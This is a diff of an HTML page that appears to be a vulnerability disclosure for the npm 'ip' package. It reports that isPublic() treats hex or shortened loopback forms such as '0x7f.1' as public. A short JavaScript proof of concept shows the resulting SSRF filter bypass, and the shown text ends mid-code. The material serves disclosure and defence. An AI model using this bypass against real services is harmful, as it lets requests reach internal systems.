@@ -14,8 +14,6 @@
     </style>
 </head>
 <body>
-
-
 <h1>SSRF Vulnerability Proof of Concept</h1>
 <pre>
 <b><Software: https://www.npmjs.com/package/ip</b>
@@ -30,18 +28,14 @@ We have discovered some missing control in your isPublic() function for identify
 As you know, you can specify IP addresses with different formats such as 0x7f1, 127.1, 127.0.0.1. We realized that isPublic() function returns true some of the private IP addresses. 
 Because of this vulnerability, attackers can bypass some SSRF mitigations.
 </pre>
-
-
 <h1>PoC</h1>
  <code>
         <br>var ip = require('ip');</br>
         <br>console.log(ip.isPublic("0x7f.1")); // true</br>
-
         <br>// Check IP and IF IP is not public do HTTP req ==> SSRF</br>
         <br>var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!</br>
         <br>// var my_ip2 = "google.com"; // public --> fetch will be completed</br>
         <br>// var my_ip3 = "127.0.0.1"; // private --> else statement will be run</br>
-
         <br>if (ip.isPublic(my_ip)) {</br>
             <br>fetch("http://" + my_ip).then((response) => {</br>
                 <br>console.log(response);</br>
